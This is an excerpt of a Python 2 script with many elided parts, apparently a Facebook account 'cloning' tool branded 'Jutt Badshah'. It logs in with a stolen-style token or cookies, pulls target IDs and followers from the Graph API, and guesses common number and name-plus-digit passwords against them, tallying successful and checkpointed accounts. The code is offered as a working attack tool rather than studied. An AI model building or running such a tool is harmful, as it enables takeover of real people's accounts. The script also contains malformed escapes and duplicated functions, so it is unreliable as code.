...
def log_menu():
    try:
        ...
        print 47 * '-'
        print '\x1b[1;96m[1] Login with FaceBook'
        print '\x1b[1;96m[2] Login with token'
        print '\x1b[1;96m[3] Login with cookies'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input(' \x1b[1;96m>>>Select')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def log_token():
    ...
    print 47 * '-'
    tok = raw_input(' \x1b[1;96mPaste token here: \x1b[1;97m')
    print 47 * '-'
...
def menu():
    ...
    try:
        ...
        print ''
        raw_input(' \x1b[1;93mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.hst.txt', 'r').read()
    print '  \x1b[1;97mLogged in user: \x1b[1;97m' + z
    print 47 * '-'
    print ' \x1b[1;97m Active token: \x1b[1;97m' + tok
    print ' ------------------------------------------ '
    print '\x1b[1;96m[1] Crack with Auto password'
    print '\x1b[1;96m[2] Crack with Number password'
    print '\x1b[1;96m[3] Crack with Name + Number password'
    print '\x1b[1;96m[4] Extract File'
...
def crack():
    ...
    os.system('clear')
    print logo
    print '\x1b[1;97m~~~~ Auto pass cracking ~~~~\x1b[1;91m'
    print 47 * '-'
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m>>>Select ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;97m~~~~ Auto pass public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;97m~~~~Auto pass public cracking~~~~'
            print ' \x1b[1;97mCloning from: ' + z
        except (KeyError, IOError):
        ...
        os.system('clear')
        print logo
        print '\x1b[1;97m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print ' \x1b[1;97mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;96m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;96m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;96m[3]Name + digit: ')
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;97m~~~~ Name pass followers cracking ~~~~'
            print ' \x1b[1;96mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;93mPress enter to try again ')
            auto_crack()
    ...
    time.sleep(0.5)
    print ' \x1b[1;96mJutt Badshah Start Cloning\x1b[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;96mJutt Badshah King Of Facebook\x1b[1;91m'
    print 47 * '-'
...
def crack_b():
    ...
    os.system('clear')
    print logo
    print '\x1b[1;97m~~~~ Number pass cracking ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;96m[1] Public id cloning'
    print '\x1b[1;96m[2] Followers cloning'
    print '\x1b[1;96m[3] File cloning'
...
def c_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' >>>Select ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;97m ~~~~ Number pass Public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;97m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;96m[1]Password: ')
        pass2 = raw_input(' \x1b[1;96m[2]Password: ')
        pass3 = raw_input(' \x1b[1;96m[3]Password: ')
        pass4 = raw_input(' \x1b[1;96m[4]Password: ')
        ...
        os.system('clear')
        print logo
        print '\x1b[1;97m~~~~ Number pass followers cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;97m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;96m[1]Password: ')
        ...
        pass3 = raw_input(' \x1b[1;96m[3]Password: ')
        pass4 = raw_input(' \x1b[1;96m[4]Password: ')
        idt = raw_input(' \x1b[1;97mEnter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
        ...
        os.system('clear')
        print logo
        print '\x1b[1;97m ~~~~ Number pass File cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;97m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;96m[1]Password: ')
    ...
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;96m~~~ Jutt Badshah Start Cloning ~~~\x1b[1;91m'
    time.sleep(0.5)
    print 47 * '-'
    print '\x\x1b[1;96mJutt King Of Fcebook\x1b[1;91m'
    print 47 * '-'
...
def crack_b():
    ...
    os.system('clear')
    print logo
    print '\x1b[1;97m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;96m[1] Public id cloning'
    print '\x1b[1;96m[2] Followers cloning'
    print '\x1b[1;96m[3] File cloning'
...
def n_s():
    ...
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;97m~~~~ Name + Number pass public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;97mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;96m[1]Name + digit: ')
        ...
        pass5 = raw_input(' \x1b[1;96m[5]Password: ')
        pass6 = raw_input(' \x1b[1;96m[6]Password: ')
        pass7 = raw_input(' \x1b[1;96m[7]Password: ')
        pass8 = raw_input(' \x1b[1;96m[8]Password: ')
        idt = raw_input(' \x1b[1;97m>>>Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            ...
            os.system('clear')
            print logo
            print '\x1b[1;97m~~~~Name pass public cracking~~~~'
            print ' \x1b[1;96mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;93mPress enter to try again ')
        ...
        os.system('clear')
        print logo
        print '\x1b[1;97m~~~~ Name + Number pass File cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;97mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;96m[1]Name + digit: ')
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mProccess Complete'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[1;97mPress enter to back')
    name_crack()
